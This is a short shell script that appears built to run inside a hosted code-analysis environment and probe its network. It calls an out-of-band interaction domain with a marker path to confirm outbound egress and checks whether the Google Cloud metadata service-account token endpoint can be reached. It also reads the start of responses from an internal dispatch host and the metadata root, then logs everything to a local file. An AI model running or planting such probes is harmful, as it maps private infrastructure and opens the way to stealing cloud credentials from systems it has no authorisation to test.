#!/bin/sh

script_dir=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd) || exit 1
exec > "$script_dir/egress.txt" 2>&1

printf '%s\n' 'External egress:'
curl -s -m 5 https://dbmo10i80pk2a4diui607dehbk8yduchb.oast.online/egress-marker-A7B3
printf '\n%s\n' 'Metadata token endpoint (HTTP status only):'
curl -s -m 5 --noproxy '*' -o /dev/null -w 'HTTP status: %{http_code}\n' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
printf '%s\n' 'Internal dispatch:'
curl -sk -m 5 https://dispatch.internal.coderabbit.ai/ | head -c 120
printf '\n%s\n' 'Metadata root:'
curl -s -m 5 http://metadata.google.internal/computeMetadata/v1/ | head -c 120
printf '\n'
